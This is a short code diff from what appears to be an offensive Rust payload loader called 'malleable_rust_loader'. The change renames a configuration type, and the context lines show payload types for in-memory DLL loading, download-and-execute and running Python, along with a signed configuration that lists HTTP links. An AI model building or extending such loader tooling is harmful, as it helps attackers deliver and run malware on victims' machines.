@@ -10,7 +10,7 @@ use malleable_rust_loader::link::FileLink;
 use malleable_rust_loader::link::HTTPLink;
 use malleable_rust_loader::link::Link;
 use malleable_rust_loader::link::MemoryLink;
-use malleable_rust_loader::loaderconf::LoaderConf;
+use malleable_rust_loader::config::Config;
 use malleable_rust_loader::payload::DllFromMemory;
 use malleable_rust_loader::payload::DownloadAndExec;
 use malleable_rust_loader::payload::ExecPython;
@@ -164,7 +164,7 @@ exec(decoded_script)
     info!("[+] LOAD ed25519 keypair from {:?}", keypair);
     let key_pair_ed25519: Ed25519KeyPair = fromfile_master_keypair(&keypair);
 
-    let loaderconf = LoaderConf::new_signed(
+    let loaderconf = Config::new_signed(
         &key_pair_ed25519,
         vec![
             Link::HTTP(HTTPLink {
